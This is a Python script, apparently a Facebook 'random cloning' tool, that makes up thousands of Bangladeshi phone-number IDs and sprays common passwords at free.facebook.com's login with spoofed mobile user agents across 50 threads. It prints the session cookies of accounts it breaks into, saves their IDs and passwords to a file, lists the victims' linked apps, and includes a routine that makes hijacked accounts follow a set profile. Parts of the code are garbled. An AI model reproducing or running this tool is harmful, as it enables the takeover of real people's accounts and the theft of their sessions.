import os

import sys

import time

import requests

import uuid

os.system('git pull')

os.system('pkg install curl')

def o():

    os.system('clear')

    jalan(logo)

    print('\033[1;32m─────────────────────────────────────────────────────────')

    jalan('\033[1;95m[\033[1;93m1\033[1;95m]\033[1;96m RANDOM CLONING ')

    jalan('\033[1;95m[\033[1;93m2\033[1;95m]\033[1;96m CONTACT ME ON FACEBOOK')

    jalan('\033[1;95m[\033[1;93m3\033[1;95m]\033[1;96m FOLLOW MY GITHUB ACCOUNT')

    jalan('\033[1;95m[\033[1;93m4\033[1;95m]\033[1;96m FOLLOW MY FB PAGE')

    jalan('\033[1;95m[\033[1;93m0\033[1;95m]\033[1;91m EXIT')

    opt = input('\n\x1b[1;32mCHOOSE : ')

    if opt == '1':

        i()

    if None == '2':

        os.system('xdg-open https://facebook.com/Twoaha.Rubaiya1')

        return None

    if None == '3':

        os.system('xdg-open https://github.com/Twoaha')

        return None

    if None == '4':

        os.system('xdg-open https://facebook.com/Twoaha.Rubaiya1')

        return None

    if None == '0':

        os.system('exit')

        return None

import os,sys,time,json,random,re,string,platform,base64,uuid

os.system("git pull")

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')   

def cek_apk(session,coki):

    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))

    else:

        print(f'\r[ðŸŽ®] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r[ðŸŽ®] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print('') 

            

def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {

            'cookie': coki }, **('cookies',)).text, 'html.parser')

        get = r.find('a', 'Ikuti', **('string',)).get('href')

        session.get('https://free.facebook.com' + str(get), {

            'cookie': coki }, **('cookies',)).text

            

            

 

class jalan:

    def __init__(self, z):

        for e in z + "\n":

            sys.stdout.write(e)

            sys.stdout.flush()

            time.sleep(0.002)

            

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today()

logo = ("""

\033[1;96m######## ##      ##  #######     ###    ##     ##    ###    
\033[1;96m   ##    ##  ##  ## ##     ##   ## ##   ##     ##   ## ##   
\033[1;96m   ##    ##  ##  ## ##     ##  ##   ##  ##     ##  ##   ##  
\033[1;96m   ##    ##  ##  ## ##     ## ##     ## ######### ##     ## 
\033[1;96m   ##    ##  ##  ## ##     ## ######### ##     ## ######### 
 \033[1;96m  ##    ##  ##  ## ##     ## ##     ## ##     ## ##     ## 
 \033[1;96m  ##     ###  ###   #######  ##     ## ##     ## ##     ## 


\033[1;96m
\033[1;96m[\033[1;96\033[1;96m]\033[1;96m AUTHOR  \033[1;96m : \033[1;96mTWOAHA IBN JALAL
\033[1;96m[\033[1;96\033[1;96m]\033[1;96m FACEBOOK\033[1;96m : \033[1;96mNILAY SARKER (TWOAHA) 
\033[1;96m[\033[1;96\033[1;96m]\033[1;96m GITHUB  \033[1;96m : \033[1;96mTWOAHA
\033[1;96m[\033[1;96\033[1;96m]\033[1;96m TOOLS   \033[1;96m : \033[1;96mRANDOM CLONING
\033[1;96m[\033[1;96\033[1;96m]\033[1;96m VERSION \033[1;96m : \033[1;96m0.1
\033[1;96m\n""")


loop = 0

oks = []

cps = []

 

def clear():

    os.system('clear')

    print(logo)

from time import localtime as lt

from os import system as cmd

ltx = int(lt()[3])

if ltx > 12:

    a = ltx-12

    tag = "PM"

else:

    a = ltx

    tag = "AM"

    

    

try:

    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')

    v = 5.2

    update = ('5.2')

    update = ('5.2')

    if str(v) in update:

        os.system('clear')

    else:pass

except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions

def dynamic(text):

    titik = ['.   ','..  ','... ','.... ']

    for o in titik:

        print('\r'+text+o),

        sys.stdout.flush();time.sleep(1)

#User agents

ugen2=[]

ugen=[]

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

# APK CHECK

def i():

    user=[]

    twf =[]

    os.getuid

    os.geteuid

    os.system("clear")

    jalan(logo)

    jalan('\033[1;92m─────────────────────────────────────────────────────')

    jalan('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;32mBD CODE    - \033[1;32m016 \033[1;32m017 \033[1;32m018 \033[1;32m019')

    jalan('\033[1;92m─────────────────────────────────────────────────────\n')

    code = input('\033[1;35m\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;32mCHOOSE YOUR COUNTRY CODE : ')

    print("")

    os.system('clear')

    bal = input("ENTER YOUR NAME : ")

    os.system('clear')

    print(logo)

    limit = int(input('EXAMPLE: 3000, 5000, 15000, 20000\n\n\033[1;91m\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;32mCHOOSE CRACKING LIMIT : '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    with ThreadPool(max_workers=50) as manshera:

        clear()

        tl = str(len(user))

        IP = requests.get('https://api.ipify.org').text

        print(f"\033[1;91m[\033[1;92m✔︎\033[1;32m]{GREEN} TODAY DATE & TIME :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")

        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m USER\'S NAME : \033[1;92m'+bal)

        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;32m'+code)

        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m TOTAL IDS : \033[1;92m'+tl)

        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m YOUR IP ADDRESS : \033[1;32m'+IP)

        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m CRACKING HAS STARTED')

        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m WORKS ON DATA AND WIFI')

        print('\033[1;93m─────────────────────────────────────────────────────')

        for love in user:

            pwx = [love, 'bangladesh','Bangladesh','I Love You','i love you','@#@#@#','@#৳%&*','I LOVE YOU','free fire','12345678','09876543','098765','112233','223344']

            uid = code+love

            manshera.submit(rcrack,uid,pwx,tl)

    print(' CRACK PROCESS HAS BEEN COMPLETED ')

    print('IDS SAVED IN TWOAHA-OK.txt, TWOAHA-CP.txt')

 

def rcrack(uid,pwx,tl):

    #print(user)

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            free_fb = session.get('https://free.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {
    'authority': 'free.facebook.com',
    'method': 'POST',
    'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'datr=6O4KZBSnsm67WYlt6Ix3zv-c; sb=6O4KZF6nJkitJn9R8VSI0qcL; dpr=2; locale=en_GB; vpd=v1%3B628x0x2; m_pixel_ratio=2; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZaQk5kYklwZnFMY2dwN0Q5WTM1MGFwVkNMRjFvbGNFdVFEUWFJNWpIRUhIbjVwN2V4RFVaTHM5S0tpT1RjdzlHYyIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZlpCTmRiSXBmcUxjZ3A3RDlZMzUwYXBWQ0xGMW9sY0V1UURRYUk1akhFSEhuNXA3ZXhEVVpMczlLS2lPVGN3OUdjIiwicyI6Im0ifQ%3D%3D; wd=360x628; dnonce=AWm7BG251M9wv2_T0KaZzo4ZK5p2Q3i8iYT1zgiPV9vxcoeRmSgiikx9X0uDbNHqpW95xlSVpYO5y--lxrtw03Pd; fr=07HuPcYq1t8N0k120.AWUF6IuyN3k5qGoxJSyyDsPPKXE.BkDIQb.f7.AAA.0.0.BkFB7G.AWXFAVom4ZU',
    'origin': 'https://free.facebook.com',
    'referer': 'https://free.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}

            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                uid = coki[7:22]

                print('\033[1;32mTWOAHA-OK ]' +uid+ ' | ' +ps+'\033[0;35m')

                print(f"{B}\033[0;35m[COOKIES] :\033[1;32m{coki}")

                cek_apk(session,coki)

                open('/sdcard/TWOAHA-OK.txt', 'a').write(uid+' | '+ps+'\n')

                oks.append(uid)

                break

            else:

                continue

        loop+=1

        sys.stdout.write('\r%s[TWOAHA] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),

        sys.stdout.flush()

    except:

        pass

o()
